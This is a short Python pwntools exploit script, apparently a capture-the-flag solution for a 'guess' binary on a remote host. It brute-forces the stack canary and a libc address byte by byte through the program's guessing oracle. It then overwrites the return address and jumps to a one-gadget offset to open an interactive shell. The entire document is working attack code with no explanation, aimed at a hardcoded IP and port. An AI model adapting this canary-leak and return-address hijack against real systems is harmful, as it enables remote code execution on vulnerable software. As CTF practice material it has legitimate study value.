#!/usr/bin/python3
from pwn import *

def guess(idx, char):
    global io
    io.sendlineafter(')? ',str(idx))
    io.sendlineafter(': ',char)
    pass

# Expl
def main():
    global io
#    io = process('./guess')
    io = remote('193.57.159.27',55206)
    canary = b''
    for i in range(7):
        for j in range(0, 256):
            guess(0x21+i, str(j))
            if b'got it!' not in io.recvline():pass
            else:
                print('Found: ' + hex(j))
                canary += p8(j)
                break
    canary = b'\x00'+canary
    print(f'Canary: {hex(u64(canary))}')
    guess(0x20,str(0))
    io.send(b'A'*0x18 + canary + b'A'*0x8 + b'\xe1\x76')
    try:
        libc = b''
        for i in range(8):
            for j in range(0, 256):
                guess(0x30+i, str(j))
                if b'got it!' not in io.recvline():pass
                else:
                    print('Found: ' + hex(j))
                    libc += p8(j)
                    break
        libc_base = u64(libc) - 0x270b3
        print(f'Libc base: {hex(libc_base)}')
        io.send(b'A'*0x18 + canary + b'A'*0x8 + p64(libc_base + 0xe6c84))
        io.interactive()
    except:
        return
if __name__=='__main__':
    while True:
        main()
